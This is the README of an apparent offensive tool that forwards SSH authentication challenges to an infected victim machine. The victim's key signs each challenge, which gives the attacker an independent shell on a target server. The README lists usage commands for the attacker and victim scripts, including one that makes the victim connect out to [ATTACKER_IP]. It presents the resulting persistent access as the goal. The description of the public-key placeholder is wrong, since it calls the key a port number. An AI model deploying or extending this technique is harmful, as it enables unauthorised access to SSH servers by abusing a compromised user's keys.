This reporsitory provides scripts for forwarding ssh authenication challenges to an infected system and using the responding signature for an independent ssh session on another device.


# Dependencies 
```
pip3 install -r requirements.txt 
```

# Usage
On the victim system: 
Get the public key as hex 
```
show_keys.py 
```

 
On the attacking system: 
```
python attacker.py -o [OWN_IP] -t [TARGET] -u [USER] -p [PORT] --pub [PUBLIC_KEY]
```

Replace the following placeholders with the appropriate values:
- [OWN_IP]: Your own IP address where the proxy will listen for incoming connections.
- [TARGET]: The hostname or IP address of the target SSH server.
- [USER]: The username to authenticate on the target SSH server.
- [PORT]: The port number of the target SSH server.
- [PUBLIC_KEY]: The port number of the target SSH server.



On the victim system: 
```
python3 victim.py --ip [ATTACKER_IP]
```

The attacking system will wait for incoming connections. As soon as a victim connects to the proxy it will start an ssh connection towards the target and forwards the authentication challenge to the connected victim. 
The victim will sign the challenge and send the signature back to the attacker. The attacker authenticates and has got an independent shell even if the victim turns off the computer. 





